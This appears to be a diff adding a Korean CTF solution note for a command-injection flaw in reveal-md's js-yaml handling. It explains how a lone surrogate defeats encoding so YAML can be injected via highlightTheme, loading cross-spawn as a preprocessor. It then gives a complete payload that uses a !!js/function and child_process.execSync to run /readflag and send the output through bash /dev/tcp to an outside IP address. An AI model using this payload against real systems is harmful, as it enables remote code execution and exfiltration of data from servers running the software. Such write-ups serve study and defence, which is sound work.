@@ -1,0 +1,29 @@
+reveal-md에서 사용하는 js-yaml에 문제가 존재한다.
+
+1. encode 함수는 lone surrogate라는 문제가 발생했을 시 encode 하지 않고 평문을 다시 반환한다.
+ 1-1. 보충 평면(supplementary plane): 유니코드 0x0000 ~ 0xFFFF 이외 추가적 유니코드, 0x010000 ~ 0x10FFFF까지. 0x010000 ~ 0xD7FF와 0xE000 ~ 0x10FFFF까지는 서로게이트 페어로 표현된다.
+ 1-2. surrogate pair: UTF-16에서 보충 평면을 위해 확장으로 사용하는 짝, 32비트이다. 고위 서로게이트, 저위 서로게이트로 분리되는데, 이 중 하나라도 없으면 해석이 불가능하다.
+ 1-3. lone surrogate: surrogate pair에서 한 쪽이 없는 상황, 유효하지 않기 때문에 구현에 따라 에러를 낸다.
+ 1-4. encodeURI 함수: lone surrogate 문제가 발생했을 때 에러를 발생시킨다, 근데 encode에서 try ~ catch를 해버림
+
+2. yaml은 highlightTheme에서 설정이 가능한데, 거기서 preprocessor에 대한 설정을 가하면 된다.
+ 2-1. yaml에서 preprocessor의 filepath를 설정한다. child_process를 활용해도 되지만, cross_spawn이란 모듈을 사용하면 더 쉽게 가능하다.
+ 2-2. 설정하면 각 모듈에는 대부분 default function이 있기 때문에 그게 밑의 코드에 따라서 preprocessorFn라는 변수에 들어가고, 여기서 똑같이 yaml을 잘 설정해서 contentOnlyMarkdown에 shell 실행코드를 넣으면 쉘이 실행된다.
+    export const getPreprocessor = async preprocessor => {
+        if (preprocessor) {
+            const { default: defaultFunc } = await import(pathToFileURL(preprocessor));
+            return defaultFunc;
+        }
+
+        return _.identity;
+    };
+
+    await preprocessorFn(contentOnlyMarkdown, options);
+ 2-3. render를 통해 함수를 실행하면 Mustache.render의 특성상 함수의 결과를 반환하기에 child process가 실행되어 cmd가 실행되고, 결과를 받을 수 있다.
+
+payload
+a\x0dpreprocessor: /app/node_modules/cross-spawn/index.js\x0dshell: sh\x0df: \uD800
+||
+{"title":"chacha","highlightTheme":"\\ud800\\u000drevealOptions:\u0020{\\u0022toJSON\\u0022:\\u0020!!js/function \\u0022function \\u005cx28\\u005cx29 {global.process.mainModule.require\\u005cx28\\u005cx27child_process\\u005cx27\\u005cx29.execSync\\u005cx28\\u005cx60bash -c \\u005cx27/readflag\\u005cx3e/dev/tcp/43.200.33.70/1234\\u005cx27\\u005cx60\\u005cx29}\\u0022}","theme":"s"}
+
+진짜 해킹방식 개 변태같네 ㄹㅇ
